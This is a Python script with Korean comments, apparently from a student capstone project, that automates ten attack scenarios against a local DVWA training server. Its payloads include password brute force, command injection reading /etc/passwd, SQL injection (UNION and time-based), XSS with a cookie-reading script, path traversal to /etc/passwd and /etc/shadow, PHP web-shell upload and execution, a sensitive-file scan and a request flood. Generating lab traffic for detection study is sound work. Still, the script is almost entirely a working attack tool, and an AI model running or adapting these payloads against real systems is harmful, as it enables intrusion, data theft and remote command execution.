import requests
from bs4 import BeautifulSoup
import argparse
import time
import sys

# DVWA 시스템 정보
TARGET_URL = "http://localhost"
LOGIN_URL = f"{TARGET_URL}/login.php"
SECURITY_URL = f"{TARGET_URL}/security.php"

# 세션 유지를 위한 requests 객체
session = requests.Session()


def get_user_token(url):
    """DVWA의 CSRF 토큰을 추출합니다."""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        token = soup.find("input", {"name": "user_token"})
        return token["value"] if token else None
    except Exception as e:
        print(f"[!] 토큰 추출 실패 (서버가 켜져 있는지 확인하세요): {e}")
        sys.exit(1)


def setup_dvwa_session():
    """DVWA 로그인 및 보안 레벨을 Low로 설정합니다."""
    print("[*] DVWA 로그인을 시도합니다...")
    user_token = get_user_token(LOGIN_URL)

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token,
    }

    res = session.post(LOGIN_URL, data=login_data)
    if "Welcome to Damn Vulnerable Web App" in res.text or "security.php" in res.text:
        print("[+] 로그인 성공!")
    else:
        print("[!] 로그인 실패. 자격 증명이나 서버 상태를 확인하세요.")
        sys.exit(1)

    print("[*] 보안 레벨을 'Low'로 변경합니다...")
    user_token = get_user_token(SECURITY_URL)
    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": user_token,
    }
    session.post(SECURITY_URL, data=security_data)
    print("[+] 보안 레벨 설정 완료.\n")


# ================== 공격 시나리오 함수들 ==================


def scenario_1_brute_force():
    print(">>> [시나리오 1] 무차별 대입 공격 (Brute Force) 시작")
    url = f"{TARGET_URL}/vulnerabilities/brute/"
    # 일반적인 패스워드들을 먼저 시도하다가 마지막에 성공 (admin/password)
    passwords = ["123456", "admin1", "qwerty", "root", "111111", "admin123", "test", "password"]

    for pwd in passwords:
        params = {"username": "admin", "password": pwd, "Login": "Login"}
        res = session.get(url, params=params)
        print(f"[-] 시도된 비밀번호: {pwd}")
        if "Welcome to the password protected area" in res.text:
            print("  [+] 공격 성공! 유효한 비밀번호 발견")
            break
        else:
            print("  [!] 로그인 실패")
        time.sleep(0.5)  # 로그 기록을 위해 약간의 딜레이
    print("<<< 공격 완료\n")


def scenario_2_command_injection():
    print(">>> [시나리오 2] 명령어 삽입 (Command Injection) 시작")
    url = f"{TARGET_URL}/vulnerabilities/exec/"
    payloads = [
        "127.0.0.1",                # 정상 백그라운드 핑 요청 (정찰)
        "127.0.0.1; pwn",           # 잘못된 리눅스 명령어
        "127.0.0.1 | dir",          # 윈도우 명령어 시도 (운영체제 추측)
        "test; echo 'hello'",       # 실패할만한 형식이 유효한지 테스트
        "127.0.0.1 && whoami",      # 권한 확인 (성공)
        "127.0.0.1; cat /etc/passwd", # 중요 파일 탈취 (완성형 페이로드)
    ]
    for payload in payloads:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(url, data=data)
        print(f"[-] 주입된 페이로드: {payload}")
        if "root:" in res.text or "uid=" in res.text or "daemon" in res.text:
            print("  [+] 명령 실행 성공 결과 확인!")
        else:
            print("  [!] 의도된 결과 미발견 (또는 정상 응답)")
        time.sleep(1)
    print("<<< 공격 완료\n")


def scenario_3_sql_injection():
    print(">>> [시나리오 3] SQL 인젝션 (Error Based) 시작")
    url = f"{TARGET_URL}/vulnerabilities/sqli/"
    payloads = [
        "1",                    # 정상 요청
        "1'",                   # 구문 오류 유발 시도
        "1\"",                  # 구문 오류 유발 시도 2
        "1 OR 1=1",             # 따옴표 누락으로 실패하는 페이로드
        "1' AND 1=2 -- ",       # 참/거짓 판단 (거짓)
        "1' OR '1'='1' -- ",    # 항상 참인 조건으로 모든 데이터 출력
        "%' AND 1=0 UNION SELECT first_name, password FROM users #", # UNION SQLi
    ]
    for payload in payloads:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(url, params=params)
        print(f"[-] 주입된 페이로드: {payload}")
        if "You have an error in your SQL syntax" in res.text:
            print("  [!] SQL 구문 오류 발생 확인 (취약점 존재 가능성 확보)")
        elif "Surname:" in res.text and payload != "1":
            print("  [+] 데이터 유출 성공!")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(1)
    print("<<< 공격 완료\n")


def scenario_4_blind_sql_injection():
    print(">>> [시나리오 4] 블라인드 SQL 인젝션 (Boolean/Time Based) 시작")
    url = f"{TARGET_URL}/vulnerabilities/sqli_blind/"
    # Boolean Based 테스트 후 Time Based로 넘어가는 연출
    payloads = [
        "1", # 정상 요청
        "1' AND 1=1 -- ", # 참
        "1' AND 1=2 -- ", # 거짓 (데이터 안 나옴)
        "1' AND (length(database()))=4 -- ", # 길이 유추
        "1' AND (length(database()))=5 -- ", # 길이 유추 실패 확인
        "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- " # Time based 최종
    ]
    for payload in payloads:
        params = {"id": payload, "Submit": "Submit"}
        print(f"[-] 페이로드 전송: {payload}")
        start_time = time.time()
        res = session.get(url, params=params)
        elapsed = time.time() - start_time
        if elapsed >= 2:
            print(f"  [+] 서버 지연 발생 ({elapsed:.2f}초)! Time-based SQLi 성공")
        elif "User ID exists in the database." in res.text and "1=2" not in payload and "length" not in payload:
            print("  [+] 참(True) 응답 획득")
        elif "1=2" in payload or "length" in payload:
            print("  [!] 거짓(False) 응답 확인")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(0.5)
    print("<<< 공격 완료\n")


def scenario_5_reflected_xss():
    print(">>> [시나리오 5] 반사형 XSS (Reflected XSS) 시작")
    url = f"{TARGET_URL}/vulnerabilities/xss_r/"
    payloads = [
        "Jiseop", # 정상 입력
        "<b>Jiseop</b>", # HTML 인젝션 테스트
        "'><script>alert(1)</script>", # 탈출 시도 (일부 문자 필터링 확인)
        "<ScRiPt>alert('bypass')</sCrIpT>", # 대소문자 우회 테스트
        "<script>console.log('test');</script>", # 단순 로그 테스트
        "<script>alert('Capstone AI Target')</script>" # 최종 페이로드
    ]
    for payload in payloads:
        params = {"name": payload}
        res = session.get(url, params=params)
        print(f"[-] 주입된 페이로드: {payload}")
        if payload in res.text and ("<script>" in payload.lower() or "<b>" in payload.lower()):
             print("  [+] XSS/HTML 페이로드가 필터링 없이 그대로 삽입됨!")
        else:
             print("  [!] 응답 확인 중 (스크립트 실행 실패 의심)...")
        time.sleep(0.8)
    print("<<< 공격 완료\n")


def scenario_6_stored_xss():
    print(">>> [시나리오 6] 저장형 XSS (Stored XSS) 시작")
    url = f"{TARGET_URL}/vulnerabilities/xss_s/"
    messages = [
        ("Visitor", "Hello! Nice site."), # 정상 글
        ("Tester", "<test>test message</test>"), # 단순 태그 필터링 확인
        ("Hacker1", "<img src=x onerror=alert('xss')>"), # img 태그 우회 시도
        ("Hacker2", "<svg/onload=alert(1)>"), # svg 우회 시도
        ("AdminGhost", '<script>console.log("Stolen Cookie: " + document.cookie);</script>') # 최종 탈취 목적 페이로드
    ]
    for name, message in messages:
        data = {
            "txtName": name,
            "mtxMessage": message,
            "btnSign": "Sign Guestbook",
        }
        session.post(url, data=data)
        print(f"[-] 게시판 작성 시도 - 이름: {name}, 내용: {message}")
        time.sleep(1)
        
    print("[-] 저장형 XSS 페이로드 작성 완료. (다른 사용자가 열람 시 실행됨)")
    print("<<< 공격 완료\n")


def scenario_7_local_file_inclusion():
    print(">>> [시나리오 7] 로컬 파일 포함 (LFI) 시작")
    url = f"{TARGET_URL}/vulnerabilities/fi/"
    payloads = [
        "include.php", # 정상 요청
        "test.php", # 존재하지 않는 파일
        "../test.php", # 한 단계 상위 경로 탐색 시도
        "../../../etc/hostname", # 리눅스 기본 호스트네임 파일 (깊이/대상 추측)
        "../../../../../../etc/shadow", # 그림자 파일 (권한 부족으로 보통 실패)
        "../../../../../../etc/passwd" # 리눅스 유저 정보 파일 (성공률 높음)
    ]
    for payload in payloads:
        params = {"page": payload}
        res = session.get(url, params=params)
        print(f"[-] 접근 시도 경로: {payload}")
        if "root:x:0:0" in res.text:
            print("  [+] /etc/passwd 내용 탈취 성공!")
        elif "Warning: include" in res.text:
            print("  [!] 임의 파일 로드 실패 (LFI 오류 코드로 취약점 확인 가능)")
        else:
            print("  [!] 정상 동작 또는 정보 없음")
        time.sleep(1)
    print("<<< 공격 완료\n")


def scenario_8_file_upload():
    print(">>> [시나리오 8] 파일 업로드 (웹 쉘 업로드) 시도 시작")
    url = f"{TARGET_URL}/vulnerabilities/upload/"

    attempts = [
        ("test.txt", "This is a test file.", "text/plain"), # 정상 업로드 시도
        ("malicious.exe", "MZ...", "application/x-msdownload"), # 차단될만한 확장자 시도
        ("webshell.php5", "<?php phpinfo(); ?>", "application/x-php"), # 확장자 필터링 우회 테스트
        ("webshell.php", '<?php system($_GET["cmd"]); ?>', "application/x-php") # 성공 목적
    ]
    
    for filename, content, mime in attempts:
        files = {
            "uploaded": (filename, content, mime)
        }
        data = {"Upload": "Upload"}
        res = session.post(url, files=files, data=data)
        print(f"[-] 업로드 시도: {filename} ({mime})")
        if "succesfully uploaded" in res.text:
             print("  [+] 파일 업로드 성공!")
        else:
             print("  [!] 파일 업로드 실패 또는 차단됨")
        time.sleep(1)

    # 업로드 된 파일 실행 시도 (로그에 남기기 위함)
    run_url = f"{TARGET_URL}/hackable/uploads/webshell.php?cmd=whoami"
    res = session.get(run_url)
    print("[-] 업로드된 웹 쉘 원격 실행 시도: ?cmd=whoami")
    # 결과 체크 (웹쉘 실행 성공 여부)
    if res.status_code == 200 and ("www-data" in res.text or "root" in res.text or "apache" in res.text):
        print(f"  [+] 명령 실행 성공: {res.text.strip()}")
    else:
        print("  [!] 웹 쉘 실행 결과 확인 불가")
    print("<<< 공격 완료\n")


def scenario_9_vuln_scanning():
    print(">>> [시나리오 9] 취약점 스캐너 모방 (Directory/File Bruteforce) 시작")
    # 서버에 존재하지 않는 민감 파일들을 연속으로 스캔
    targets = [
        "/admin/",
        "/admin.php",
        "/config.php.bak",
        "/.env",
        "/.git/config",
        "/phpinfo.php",
        "/backup.zip",
        "/db.sql",
        "/vulnerabilities/fi/", # 정상 경로 하나 섞음
        "/uploads/",
        "/test.php"
    ]
    print("[-] 숨겨진 파일 및 디렉터리 무차별 탐색 중...")
    for path in targets:
        res = session.get(f"{TARGET_URL}{path}")
        print(f"[-] 스캔: {path} -> HTTP {res.status_code}")
        time.sleep(0.3)
    print("<<< 공격 완료\n")


def scenario_10_http_get_flood():
    print(">>> [시나리오 10] HTTP GET Flooding (볼륨 팽창/DDoS 모방) 시작")
    url = f"{TARGET_URL}/vulnerabilities/fi/?page=include.php"
    print("[-] 짧은 시간 동안 여러 엔드포인트에 50번의 요청을 전송합니다...")
    
    endpoints = [
        url,
        f"{TARGET_URL}/vulnerabilities/brute/",
        f"{TARGET_URL}/vulnerabilities/sqli/",
    ]
    
    for i in range(50):
        target = endpoints[i % len(endpoints)]
        session.get(target)
        if (i+1) % 10 == 0:
            print(f"  [-] {i+1}개 요청 전송 완료...")
            time.sleep(0.1) # 약간의 딜레이
            
    print("[-] 다량의 GET 요청 전송 완료 (로그 볼륨 팽창 확인용)")
    print("<<< 공격 완료\n")


# ==========================================================


def main():
    parser = argparse.ArgumentParser(
        description="DVWA 캡스톤디자인 공격 시나리오 자동화 스크립트"
    )
    parser.add_argument(
        "-s",
        "--scenario",
        type=int,
        choices=range(1, 11),
        help="실행할 공격 시나리오 번호를 입력하세요 (1~10)",
    )

    args = parser.parse_args()

    if not args.scenario:
        print("[!] 사용법: python attacker_script.py -s [시나리오번호]")
        print("예시: python attacker_script.py -s 1")
        sys.exit(1)

    # 사전 준비 (세션 연결)
    setup_dvwa_session()

    # 선택된 시나리오 실행 (파이썬 딕셔너리를 활용한 스위치 케이스)
    scenarios = {
        1: scenario_1_brute_force,
        2: scenario_2_command_injection,
        3: scenario_3_sql_injection,
        4: scenario_4_blind_sql_injection,
        5: scenario_5_reflected_xss,
        6: scenario_6_stored_xss,
        7: scenario_7_local_file_inclusion,
        8: scenario_8_file_upload,
        9: scenario_9_vuln_scanning,
        10: scenario_10_http_get_flood,
    }

    scenarios[args.scenario]()


if __name__ == "__main__":
    main()
